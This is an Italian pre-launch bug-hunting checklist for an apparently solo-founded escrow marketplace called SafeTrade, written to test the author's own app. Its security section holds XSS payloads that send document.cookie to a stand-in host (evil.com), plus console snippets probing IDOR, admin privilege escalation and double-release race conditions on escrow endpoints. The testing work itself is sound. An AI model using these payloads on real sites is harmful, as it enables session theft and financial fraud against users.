# 🐛 SafeTrade — BUG HUNTING GUIDE

> **Obiettivo**: Trovare bug nascosti prima che li trovino gli utenti  
> **Per**: Founder solo | **Approccio**: Manuale + DevTools  
> **Tempo totale stimato**: ~6-8 ore (dividibile in sessioni)

---

## SEZIONE 1: BUG DI SICUREZZA (Tempo stimato: 120 min)

### 1.1 Cross-Site Scripting (XSS)

- [ ] **BUG-SEC-01** — Stored XSS nei listing
  - 🔍 **Tipo**: Stored XSS — script salvato nel DB e eseguito quando altri utenti vedono il listing
  - ⚠️ **Impatto**: CRITICO — furto sessione, redirect a phishing, defacement
  - 🎯 **Riproduzione**:
    1. Crea listing con titolo: `Test <img src=x onerror=alert(document.cookie)>`
    2. Crea listing con descrizione: `<div onmouseover="fetch('https://evil.com?c='+document.cookie)">hover me</div>`
    3. Vai su `/listings` e cerca il listing
    4. Apri il dettaglio listing
    5. Apri DevTools → Console: cerca errori JS o popup
  - 🛠️ **Verifica fix**: Il testo deve apparire come testo puro, DOMPurify deve sanitizzare l'output. Verifica che `dangerouslySetInnerHTML` non sia usato senza sanitizzazione

- [ ] **BUG-SEC-02** — XSS nei commenti community
  - 🔍 **Tipo**: Stored XSS tramite contenuto community
  - ⚠️ **Impatto**: CRITICO
  - 🎯 **Riproduzione**:
    1. Crea post con corpo: `<script>new Image().src='https://evil.com/steal?cookie='+document.cookie</script>`
    2. Commenta con: `[Click here](javascript:alert(1))`
    3. Verifica rendering del post e dei commenti
  - 🛠️ **Verifica fix**: Nessun script eseguito, link javascript: non cliccabile/rimosso

- [ ] **BUG-SEC-03** — XSS via URL params
  - 🔍 **Tipo**: Reflected XSS
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. Naviga a: `/listings?game=<script>alert(1)</script>`
    2. Naviga a: `/listings?search="><img src=x onerror=alert(1)>`
    3. Verifica che i parametri non vengano renderizzati raw nella pagina
  - 🛠️ **Verifica fix**: Parametri URL escaped prima del rendering, nessun innerHTML con dati URL

- [ ] **BUG-SEC-04** — XSS via nome utente/profilo
  - 🔍 **Tipo**: Stored XSS tramite dati profilo
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. Registra utente con nome: `<img src=x onerror=alert('XSS')>`
    2. Vai su listing creato da questo utente → verifica che il nome non esegua script
    3. Vai su community → verifica post di questo utente
    4. Vai su notifiche → verifica menzione di questo utente
  - 🛠️ **Verifica fix**: Nome sanitizzato in tutti i contesti di rendering

### 1.2 Insecure Direct Object Reference (IDOR)

- [ ] **BUG-SEC-05** — IDOR su listing altrui
  - 🔍 **Tipo**: IDOR — accesso/modifica risorse senza autorizzazione
  - ⚠️ **Impatto**: CRITICO
  - 🎯 **Riproduzione**:
    1. Logga come User A, crea listing, copia ID
    2. Logga come User B
    3. DevTools → Console:
       ```javascript
       // Prova a modificare listing di A
       fetch('/api/listings/ID_LISTING_A', {
         method: 'PATCH',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({title: 'HACKERATO', price: 0.01})
       }).then(r => r.json()).then(console.log)
       
       // Prova a cancellare
       fetch('/api/listings/ID_LISTING_A', {
         method: 'DELETE'
       }).then(r => r.json()).then(console.log)
       ```
    4. Verifica risposta: deve essere 403
  - 🛠️ **Verifica fix**: Ogni API controlla `userId === listing.userId` prima di modificare

- [ ] **BUG-SEC-06** — IDOR su transazioni escrow
  - 🔍 **Tipo**: IDOR su operazioni finanziarie
  - ⚠️ **Impatto**: CRITICO
  - 🎯 **Riproduzione**:
    1. User A ha transazione escrow attiva con ID `txn_123`
    2. Logga come User C (non coinvolto)
    3. Prova:
       ```javascript
       fetch('/api/transactions/txn_123').then(r => r.json()).then(console.log)
       fetch('/api/escrow/sessions/SESSION_ID/close', {method:'POST'}).then(r=>r.json()).then(console.log)
       fetch('/api/escrow/payments/PAY_ID/release', {method:'POST'}).then(r=>r.json()).then(console.log)
       ```
  - 🛠️ **Verifica fix**: API verifica che l'utente sia buyer, seller, o merchant coinvolto

- [ ] **BUG-SEC-07** — IDOR su depositi vault
  - 🔍 **Tipo**: IDOR su vault
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. User A ha deposito vault `dep_456`
    2. Come User B:
       ```javascript
       fetch('/api/vault/deposits/dep_456').then(r=>r.json()).then(console.log)
       fetch('/api/vault/deposits/dep_456/mark-shipped', {method:'POST'}).then(r=>r.json()).then(console.log)
       ```
  - 🛠️ **Verifica fix**: Solo owner del deposito può vederlo/modificarlo

- [ ] **BUG-SEC-08** — IDOR admin API senza ruolo
  - 🔍 **Tipo**: Privilege escalation
  - ⚠️ **Impatto**: CRITICO
  - 🎯 **Riproduzione**:
    1. Logga come USER (ruolo base)
    2. Prova:
       ```javascript
       // Approva merchant application
       fetch('/api/admin/applications/APP_ID', {
         method: 'PATCH',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({status: 'APPROVED'})
       }).then(r=>r.json()).then(console.log)
       
       // Approva vault case request
       fetch('/api/admin/vault/requests/REQ_ID', {
         method: 'PATCH',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({status: 'APPROVED'})
       }).then(r=>r.json()).then(console.log)
       ```
  - 🛠️ **Verifica fix**: `requireRole('ADMIN')` su ogni endpoint admin

### 1.3 Sessioni & Autenticazione

- [ ] **BUG-SEC-09** — Session fixation
  - 🔍 **Tipo**: Riutilizzo sessione pre-login
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. Apri sito (non loggato), copia valore cookie di sessione
    2. Logga
    3. Verifica che il cookie sia CAMBIATO (nuova sessione post-login)
  - 🛠️ **Verifica fix**: Supabase dovrebbe rigenerare token al login. Verifica che `access_token` cambi

- [ ] **BUG-SEC-10** — Logout incompleto
  - 🔍 **Tipo**: Sessione non invalidata
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. Logga, copia tutti i cookie (DevTools → Application → Cookies)
    2. Logout
    3. Con tool HTTP (o DevTools), rimanda richiesta a `/api/auth/me` con i vecchi cookie
  - 🛠️ **Verifica fix**: Vecchi cookie invalidi, server ritorna 401

- [ ] **BUG-SEC-11** — JWT/Token esposti nel client
  - 🔍 **Tipo**: Token leak
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Apri DevTools → Application → Local Storage, Session Storage
    2. Cerca token, JWT, access_token, refresh_token
    3. Verifica che non ci siano token sensibili esposti in localStorage (meglio in httpOnly cookie)
  - 🛠️ **Verifica fix**: Token solo in httpOnly cookie, non in localStorage

### 1.4 Informazioni Sensibili Esposte

- [ ] **BUG-SEC-12** — API response con dati extra
  - 🔍 **Tipo**: Information disclosure
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Chiama `GET /api/listings/[id]` → verifica che NON contenga: email seller, password hash, dati interni
    2. Chiama `GET /api/user/profile` di un altro utente → verifica no email, no telefono privato
    3. Chiama `GET /api/community` → verifica no dati privati autori
    4. Ispeziona tutte le risposte API in DevTools → Network per dati inattesi
  - 🛠️ **Verifica fix**: Usa select/omit specifici in Prisma, mai `include: { user: true }` senza filtro campi

- [ ] **BUG-SEC-13** — Error stack trace in produzione
  - 🔍 **Tipo**: Information leakage
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Chiama `/api/listings/not-a-valid-id` → verifica risposta errore
    2. Chiama `/api/vault/deposits/999999999` → verifica
    3. Invia JSON malformato a qualsiasi POST endpoint
    4. Cerca nelle risposte: stack trace, nomi file server, versioni pacchetti, query SQL
  - 🛠️ **Verifica fix**: Errori generici in produzione (`NODE_ENV=production`), log dettagliato solo server-side

- [ ] **BUG-SEC-14** — Headers di sicurezza
  - 🔍 **Tipo**: Missing security headers
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. DevTools → Network → Clicca qualsiasi richiesta → Response Headers
    2. Verifica presenza di:
       - `X-Content-Type-Options: nosniff`
       - `X-Frame-Options: DENY` (o SAMEORIGIN)
       - `Strict-Transport-Security` (HSTS)
       - `Content-Security-Policy` (almeno base)
       - `Referrer-Policy: strict-origin-when-cross-origin`
  - 🛠️ **Verifica fix**: Headers configurati in `next.config.js` → `headers()` o middleware

---

## SEZIONE 2: RACE CONDITIONS (Tempo stimato: 60 min)

### 2.1 Doppio Click / Submit

- [ ] **BUG-RACE-01** — Doppia proposta d'acquisto
  - 🔍 **Tipo**: Race condition — doppio submit crea due proposte
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. Vai su listing → "Invia proposta"
    2. Doppio click VELOCE sul bottone submit
    3. Oppure da Console:
       ```javascript
       // Simula doppio submit
       const body = JSON.stringify({listingId:'xxx', amount:10, feePaidBy:'SELLER'});
       Promise.all([
         fetch('/api/proposals', {method:'POST', headers:{'Content-Type':'application/json'}, body}),
         fetch('/api/proposals', {method:'POST', headers:{'Content-Type':'application/json'}, body})
       ]).then(r => Promise.all(r.map(x=>x.json()))).then(console.log)
       ```
    4. Controlla che non siano state create 2 proposte
  - 🛠️ **Verifica fix**: Bottone disabilitato dopo click + constraint DB su proposta unica per listing/user, oppure idempotency key

- [ ] **BUG-RACE-02** — Doppio pagamento escrow
  - 🔍 **Tipo**: Race condition finanziaria
  - ⚠️ **Impatto**: CRITICO
  - 🎯 **Riproduzione**:
    1. In flusso escrow, arriva al pagamento
    2. Da Console, invia 2 richieste simultanee a `/api/escrow/payments`
    3. Verifica che non vengano creati 2 pagamenti
  - 🛠️ **Verifica fix**: Lock ottimistico su transazione, status check atomico, rate limiting

- [ ] **BUG-RACE-03** — Doppio rilascio fondi
  - 🔍 **Tipo**: Race condition — fondi rilasciati 2 volte
  - ⚠️ **Impatto**: CRITICO
  - 🎯 **Riproduzione**:
    1. Transazione escrow pronta per release
    2. Da Console:
       ```javascript
       Promise.all([
         fetch('/api/escrow/payments/PAY_ID/release', {method:'POST'}),
         fetch('/api/escrow/payments/PAY_ID/release', {method:'POST'})
       ]).then(r => Promise.all(r.map(x=>x.json()))).then(console.log)
       ```
    3. Verifica: solo 1 release eseguito, secondo ritorna errore
  - 🛠️ **Verifica fix**: Status check prima di release + transaction DB con lock

- [ ] **BUG-RACE-04** — Doppio refund
  - 🔍 **Tipo**: Race condition — refund duplicato
  - ⚠️ **Impatto**: CRITICO
  - 🎯 **Riproduzione**:
    1. Come sopra ma con `/api/escrow/payments/PAY_ID/refund`
    2. Verifica che il secondo refund fallisca
  - 🛠️ **Verifica fix**: Stesso meccanismo di lock, audit log per ogni tentativo

### 2.2 Refresh & Navigazione

- [ ] **BUG-RACE-05** — F5 durante creazione listing
  - 🔍 **Tipo**: Duplicazione da refresh
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Compila form listing completo
    2. Clicca "Pubblica"
    3. IMMEDIATAMENTE premi F5
    4. Se browser chiede "Reinvia dati form?", clicca Sì
    5. Verifica in `/listings` quanti listing sono stati creati
  - 🛠️ **Verifica fix**: Post-Redirect-Get pattern (redirect dopo POST), o idempotency key

- [ ] **BUG-RACE-06** — Back button dopo submit
  - 🔍 **Tipo**: Stato inconsistente post-navigazione
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Crea listing → successo → sei su pagina conferma
    2. Premi Back
    3. Il form è ancora compilato? Puoi ri-submittare?
  - 🛠️ **Verifica fix**: Form resettato dopo submit, o redirect che previene re-submit

### 2.3 Concorrenza Multi-Utente

- [ ] **BUG-RACE-07** — Due utenti accettano stessa proposta
  - 🔍 **Tipo**: Race condition multi-utente
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. Buyer invia proposta su listing
    2. Apri 2 browser (o tab incognito) come seller
    3. In entrambi, clicca "Accetta" quasi simultaneamente
    4. Verifica che venga creata UNA SOLA transazione
  - 🛠️ **Verifica fix**: Optimistic locking su proposal status, constraint DB

- [ ] **BUG-RACE-08** — Assegnamento vault slot simultaneo
  - 🔍 **Tipo**: Race condition su risorsa limitata (slot)
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. Case vault con slot S01 libero
    2. Da 2 sessioni merchant simultanee, prova ad assegnare diverso item a S01
    3. Verifica che solo 1 assegnamento vada a buon fine
  - 🛠️ **Verifica fix**: Constraint UNIQUE su `(caseId, slotNumber)`, transaction isolata

- [ ] **BUG-RACE-09** — Listing venduto mentre si naviga
  - 🔍 **Tipo**: Stale data — utente vede listing che non è più disponibile
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. User A apre listing detail
    2. User B acquista listing (proposta → accettazione → transazione)
    3. User A prova a comprare lo stesso listing
  - 🛠️ **Verifica fix**: Check freshness dello stato listing al momento della proposta, errore user-friendly

---

## SEZIONE 3: ERROR HANDLING (Tempo stimato: 60 min)

### 3.1 Errori 500 che Leakano Info

- [ ] **BUG-ERR-01** — API con ID inesistente
  - 🔍 **Tipo**: Error handling — information leak
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. `GET /api/listings/aaaaaa-bbbb-cccc-dddd-eeeeeeee` (UUID invalido)
    2. `GET /api/listings/1` (formato sbagliato se usi UUID)
    3. `GET /api/vault/deposits/DOESNT_EXIST`
    4. `GET /api/transactions/DOESNT_EXIST`
    5. Per ciascuno: ispeziona response body per stack trace, nomi file, query DB
  - 🛠️ **Verifica fix**: Risposta 404 pulita `{error: "Risorsa non trovata"}`, nessun leak

- [ ] **BUG-ERR-02** — API con body malformato
  - 🔍 **Tipo**: Crash su input invalido
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. ```javascript
       // Body non-JSON
       fetch('/api/listings', {method:'POST', body:'not json', headers:{'Content-Type':'application/json'}})
       
       // Body vuoto
       fetch('/api/listings', {method:'POST', headers:{'Content-Type':'application/json'}})
       
       // Campi tipo sbagliato
       fetch('/api/listings', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({title:123, price:'abc'})})
       
       // Array invece di oggetto
       fetch('/api/listings', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify([1,2,3])})
       ```
  - 🛠️ **Verifica fix**: 400 Bad Request con messaggio chiaro per ogni caso, no 500

- [ ] **BUG-ERR-03** — Upload immagine fallito
  - 🔍 **Tipo**: Error handling upload
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Crea listing, carica immagine
    2. Disattiva internet DURANTE l'upload (DevTools → Network → Offline)
    3. Verifica: il form mostra errore? Si può riprovare?
    4. Prova con immagine corrotta (file .jpg con contenuto random)
  - 🛠️ **Verifica fix**: Messaggio "Upload fallito, riprova", form non si blocca, progress bar si resetta

- [ ] **BUG-ERR-04** — Database connection failure simulata
  - 🔍 **Tipo**: Resilienza a errori infrastruttura
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. Se possibile in staging: cambia `DATABASE_URL` a indirizzo sbagliato temporaneamente
    2. Naviga su qualsiasi pagina
    3. Verifica: errore user-friendly? O schermata bianca? O stack trace?
  - 🛠️ **Verifica fix**: Pagina errore generica "Servizio temporaneamente non disponibile", no leak connection string

### 3.2 Validazione Lato Server

- [ ] **BUG-ERR-05** — Bypass validazione client-side
  - 🔍 **Tipo**: Missing server-side validation
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. Da Console, invia listing senza validazione:
       ```javascript
       fetch('/api/listings', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
           title: '',  // vuoto
           price: -100,  // negativo
           type: 'INVALID_TYPE',  // tipo non valido
           game: 'DOESNT_EXIST',  // gioco non valido
           condition: 'PERFECT'  // condizione non valida
         })
       }).then(r=>r.json()).then(console.log)
       ```
    2. Verifica che il server RIFIUTI tutto
  - 🛠️ **Verifica fix**: Errore 400 per ogni campo invalido, mai fidarsi solo del client

- [ ] **BUG-ERR-06** — Validazione importi (amount validation)
  - 🔍 **Tipo**: Manipolazione importi
  - ⚠️ **Impatto**: CRITICO
  - 🎯 **Riproduzione**:
    1. Proposta con importo 0
    2. Proposta con importo -50
    3. Proposta con importo 999999999
    4. Proposta con importo 0.001 (troppi decimali)
    5. Proposta dove `amount` e `listing.price` non matchano (se relevant)
  - 🛠️ **Verifica fix**: Lib `amount-validation.ts` attiva su ogni endpoint finanziario

- [ ] **BUG-ERR-07** — Enum values manipolati
  - 🔍 **Tipo**: Invalid enum injection
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Cambia `feePaidBy` a "NOBODY" (valore non previsto)
    2. Cambia `type` listing a "FREE"
    3. Cambia `status` proposta a "APPROVED" (bypass flow)
    4. Verifica per ciascuno: il server accetta o rifiuta?
  - 🛠️ **Verifica fix**: Validazione enum server-side con Zod o simile

### 3.3 Pagine di Errore

- [ ] **BUG-ERR-08** — Pagina 404 custom
  - 🔍 **Tipo**: UX — pagina non trovata
  - ⚠️ **Impatto**: BASSO
  - 🎯 **Riproduzione**:
    1. Naviga a `/this-page-does-not-exist`
    2. Naviga a `/listings/zzzzzzzzzzz`
    3. Naviga a `/merchant/vault/fake`
  - 🛠️ **Verifica fix**: Pagina 404 con branding SafeTrade, link a homepage, non pagina Next.js di default

- [ ] **BUG-ERR-09** — Error boundary React
  - 🔍 **Tipo**: Crash UI non gestito
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Se c'è un `error.tsx` nella root dell'app, verifica che funzioni
    2. Simula: crea un listing con dati che causano errore di rendering (es. immagine con URL rotto)
    3. Verifica che la pagina non diventi bianca
  - 🛠️ **Verifica fix**: Error boundary cattura errore, mostra "Qualcosa è andato storto" con bottone retry

---

## SEZIONE 4: MOBILE / RESPONSIVE (Tempo stimato: 60 min)

### 4.1 Layout Rotti

- [ ] **BUG-MOB-01** — Overflow orizzontale
  - 🔍 **Tipo**: Layout break — scroll orizzontale indesiderato
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. DevTools → dispositivo mobile (iPhone 14 Pro, 393px)
    2. Naviga OGNI pagina principale:
       - Homepage `/`
       - Listings `/listings`
       - Listing detail `/listings/[id]`
       - Create listing `/listings/create`
       - Dashboard `/dashboard`
       - Merchant dashboard `/merchant/vault`
       - Community `/community`
    3. Per ciascuna: c'è scroll orizzontale?
  - 🛠️ **Verifica fix**: `overflow-x: hidden` dove necessario, mai `width` fissi su mobile

- [ ] **BUG-MOB-02** — Tabelle e griglie rotte su mobile
  - 🔍 **Tipo**: Tabelle non responsive
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Pagine con tabelle: admin listings, admin applications, merchant inventory, vault deposits
    2. Su mobile: le colonne si sovrappongono? Il testo è leggibile?
  - 🛠️ **Verifica fix**: Tabelle con scroll orizzontale o stack verticale su mobile, font ≥14px

- [ ] **BUG-MOB-03** — Form inutilizzabili su mobile
  - 🔍 **Tipo**: UX — form touch-unfriendly
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. Su mobile (reale o DevTools), apri form creazione listing
    2. Verifica:
       - Input abbastanza grandi per dita (min 44x44px touch target)
       - Select/dropdown funzionano (non solo hover)
       - Keyboard non copre il campo attivo
       - Date picker mobile-friendly
       - Upload immagini funziona da camera/galleria
  - 🛠️ **Verifica fix**: Touch target adeguati, `input[type]` appropriati per mobile keyboard

- [ ] **BUG-MOB-04** — Header/Navigazione mobile
  - 🔍 **Tipo**: Navigazione rotta su mobile
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. Su mobile: apri hamburger menu (o navigation mobile)
    2. Verifica tutti i link funzionanti
    3. Verifica che il menu si chiuda dopo click su link
    4. Verifica NotificationBell cliccabile e leggibile
    5. Verifica che il logo/back non sia tagliato
  - 🛠️ **Verifica fix**: Menu mobile funzionale, z-index corretto, overlay che chiude al tap fuori

### 4.2 Touch Interactions

- [ ] **BUG-MOB-05** — Swipe e gesture
  - 🔍 **Tipo**: Touch gesture non gestite
  - ⚠️ **Impatto**: BASSO
  - 🎯 **Riproduzione**:
    1. Gallery immagini listing: swipe per navigare tra foto
    2. Pull-to-refresh su listing list
    3. Pinch-to-zoom su immagini
    4. Long-press su elementi (non deve causare selezione testo indesiderata)
  - 🛠️ **Verifica fix**: Gallery con swipe, immagini zoomabili, `-webkit-touch-callout: none` dove appropriato

- [ ] **BUG-MOB-06** — QR Scanner su mobile
  - 🔍 **Tipo**: Funzionalità critica mobile-only
  - ⚠️ **Impatto**: CRITICO
  - 🎯 **Riproduzione**:
    1. Su telefono reale (non DevTools): logga come merchant
    2. Vai a `/merchant/verify/scan` → apri scanner QR
    3. Verifica: permessi camera richiesti? Scanner funziona?
    4. Prova in luce scarsa
    5. Prova con QR parzialmente coperto
    6. Vai a `/merchant/vault/scan` → scanner slot vault
  - 🛠️ **Verifica fix**: Camera permission dialog, feedback visivo durante scan, retry facile

### 4.3 Viewport & Device Specifici

- [ ] **BUG-MOB-07** — Notch e safe areas (iPhone)
  - 🔍 **Tipo**: Content nascosto da notch/dynamic island
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. DevTools → iPhone 14 Pro (con notch)
    2. Verifica header non coperto
    3. Verifica footer non coperto dalla barra navigazione
    4. Verifica in modalità landscape
  - 🛠️ **Verifica fix**: `env(safe-area-inset-*)` in CSS, `viewport-fit=cover` in meta tag

- [ ] **BUG-MOB-08** — Keyboard virtuale che copre input
  - 🔍 **Tipo**: UX — input nascosto da keyboard
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Su telefono reale: apri form con molti campi (es. creazione listing)
    2. Tap sull'ultimo campo del form
    3. La keyboard copre l'input? La pagina scrolla per mostrarlo?
  - 🛠️ **Verifica fix**: `scrollIntoView` su focus, o `visualViewport` API

---

## SEZIONE 5: PERFORMANCE DEGRADATIONS (Tempo stimato: 60 min)

### 5.1 Memory Leaks

- [ ] **BUG-PERF-01** — Memory leak da navigazione
  - 🔍 **Tipo**: Memory leak — memoria che cresce senza liberarsi
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. DevTools → Memory → nota heap size iniziale
    2. Naviga avanti e indietro tra 10 pagine diverse (listings, detail, dashboard, community) per 20 volte
    3. Nota heap size finale
    4. Force garbage collection (DevTools → Memory → 🗑️)
    5. Se heap > 2x iniziale dopo GC → leak
  - 🛠️ **Verifica fix**: Cleanup in `useEffect` return, no event listener orfani, abort controller su fetch

- [ ] **BUG-PERF-02** — Memory leak da React Query
  - 🔍 **Tipo**: Cache infinita
  - ⚠️ **Impatto**: BASSO
  - 🎯 **Riproduzione**:
    1. Naviga su 50+ listing diversi
    2. DevTools → Memory → heap snapshot
    3. Cerca "QueryCache" o oggetti con tanti listing cachati
  - 🛠️ **Verifica fix**: `staleTime` e `cacheTime` configurati ragionevolmente, non infiniti

### 5.2 API Lente

- [ ] **BUG-PERF-03** — Query N+1 su listing list
  - 🔍 **Tipo**: Performance — troppe query DB
  - ⚠️ **Impatto**: ALTO
  - 🎯 **Riproduzione**:
    1. DevTools → Network → filtra per `api/`
    2. Carica `/listings`
    3. Conta le chiamate API: dovrebbe essere 1 (o 2 con paginazione)
    4. Se vedi 20+ chiamate per caricare una pagina di listing → N+1
    5. Nota response time di `GET /api/listings`: deve essere < 500ms
  - 🛠️ **Verifica fix**: Prisma `include` per eager loading, no chiamate singole per ogni listing

- [ ] **BUG-PERF-04** — Ricerca listing lenta
  - 🔍 **Tipo**: Performance — query pesante
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Con 500+ listing nel DB
    2. Cerca con filtro testo libero
    3. DevTools → Network → nota response time
    4. Filtra per: gioco + condizione + prezzo + città
  - 🛠️ **Verifica fix**: Indici DB su colonne filtrate, response < 1s

- [ ] **BUG-PERF-05** — Upload immagini lento
  - 🔍 **Tipo**: UX/Performance — upload senza feedback
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Carica 5 immagini da 4MB ciascuna
    2. C'è progress bar? Spinner? O la pagina sembra bloccata?
    3. Quanto tempo totale?
  - 🛠️ **Verifica fix**: Progress bar per upload, ottimizzazione client-side prima dell'upload (resize)

### 5.3 Rendering

- [ ] **BUG-PERF-06** — Re-render inutili
  - 🔍 **Tipo**: Performance — componenti che si ri-renderizzano troppo
  - ⚠️ **Impatto**: BASSO
  - 🎯 **Riproduzione**:
    1. React DevTools (estensione) → Profiler → Start recording
    2. Naviga su `/listings`, scrolla, applica filtro
    3. Guarda quante volte `AllListingsGrid` si ri-renderizza
    4. Ogni card deve ri-renderizzarsi solo se i suoi dati cambiano
  - 🛠️ **Verifica fix**: `React.memo` su componenti lista, `useMemo`/`useCallback` dove appropriato

- [ ] **BUG-PERF-07** — Layout shift (CLS)
  - 🔍 **Tipo**: Visual instability — elementi che saltano durante caricamento
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Carica `/listings` con throttle "Fast 3G"
    2. Osserva: le card saltano quando le immagini caricano?
    3. I filtri spostano il contenuto quando appaiono?
    4. I placeholder/skeleton hanno stesse dimensioni dei contenuti finali?
  - 🛠️ **Verifica fix**: `width`/`height` su immagini, skeleton loader con dimensioni fisse, Lighthouse CLS < 0.1

### 5.4 Bundle & Loading

- [ ] **BUG-PERF-08** — Bundle size eccessivo
  - 🔍 **Tipo**: Performance — JavaScript troppo pesante
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. `npx next build` → guarda output dimensioni bundle
    2. DevTools → Network → filtra JS → nota dimensioni totali
    3. Pagina homepage: JS totale deve essere < 300KB gzipped
    4. Controlla se librerie pesanti (moment.js, lodash completo) sono incluse
  - 🛠️ **Verifica fix**: Dynamic imports per componenti pesanti, tree shaking, `next/dynamic` per componenti non-critical

- [ ] **BUG-PERF-09** — Hydration mismatch
  - 🔍 **Tipo**: SSR/CSR mismatch — warning in console
  - ⚠️ **Impatto**: MEDIO
  - 🎯 **Riproduzione**:
    1. Apri qualsiasi pagina
    2. DevTools → Console → cerca warning "Hydration"
    3. Pagine note per problemi: quelle con `new Date()`, `Math.random()`, `window.innerWidth`
  - 🛠️ **Verifica fix**: `useEffect` per valori client-only, `suppressHydrationWarning` solo se intenzionale

---

## SEZIONE 6: BONUS — CHECKLIST RAPIDA PRE-DEPLOY (15 min)

> Speed run finale prima di andare live.

- [ ] **DEPLOY-01** — `NODE_ENV=production` attivo
- [ ] **DEPLOY-02** — `.env` non esposto (non nel bundle, non in git)
- [ ] **DEPLOY-03** — `NEXT_PUBLIC_*` non contengono segreti (solo chiavi pubbliche Supabase)
- [ ] **DEPLOY-04** — Rate limiting attivo su tutte le API critiche
- [ ] **DEPLOY-05** — Logging funzionante (errori loggati su servizio esterno o almeno su Vercel logs)
- [ ] **DEPLOY-06** — HTTPS forzato (redirect da HTTP)
- [ ] **DEPLOY-07** — Cookie `Secure` e `SameSite` impostati
- [ ] **DEPLOY-08** — Database backup automatico configurato
- [ ] **DEPLOY-09** — Dominio custom configurato con SSL
- [ ] **DEPLOY-10** — Meta tag SEO su pagine pubbliche (`<title>`, `<meta description>`, `og:image`)
- [ ] **DEPLOY-11** — `robots.txt` presente con path admin/API esclusi
- [ ] **DEPLOY-12** — `sitemap.xml` generato
- [ ] **DEPLOY-13** — Favicon e manifest.json presenti
- [ ] **DEPLOY-14** — Error monitoring (Sentry o simile) configurato
- [ ] **DEPLOY-15** — Analytics (Vercel Analytics, Plausible, o GA4) attivo

---

## RIEPILOGO BUG HUNTING

| Sezione | Bug da cercare | Tempo | Impatto medio |
|---------|---------------|-------|---------------|
| 🔒 Sicurezza | 14 test | 120 min | CRITICO |
| ⚡ Race Conditions | 9 test | 60 min | ALTO |
| 💥 Error Handling | 9 test | 60 min | MEDIO |
| 📱 Mobile | 8 test | 60 min | ALTO |
| 🐌 Performance | 9 test | 60 min | MEDIO |
| 🚀 Pre-Deploy | 15 check | 15 min | VARIO |

**Strategia**: Parti dalla sicurezza e race conditions (massimo impatto), poi mobile (esperienza utente), poi performance e pre-deploy.

---

## TEMPLATE PER REPORT BUG TROVATO

Quando trovi un bug, copialo in un file `BUGS_FOUND.md` con questo template:

```markdown
### BUG-XXX — [Titolo breve]

- **Trovato**: [data]
- **ID Test**: [es. BUG-SEC-05]
- **Severità**: 🔴 CRITICA / 🟡 ALTA / 🟢 BASSA
- **Pagina/API**: [URL esatto]
- **Riproduzione**:
  1. [passo 1]
  2. [passo 2]
  3. [passo 3]
- **Risultato attuale**: [cosa succede ora]
- **Risultato atteso**: [cosa dovrebbe succedere]
- **Screenshot**: [se disponibile]
- **Fix applicato**: [ ] Sì / [ ] No
- **Fix verificato**: [ ] Sì / [ ] No
```

---

> **Ultimo aggiornamento**: Febbraio 2026  
> **Autore**: Bug Hunting Pre-Launch SafeTrade
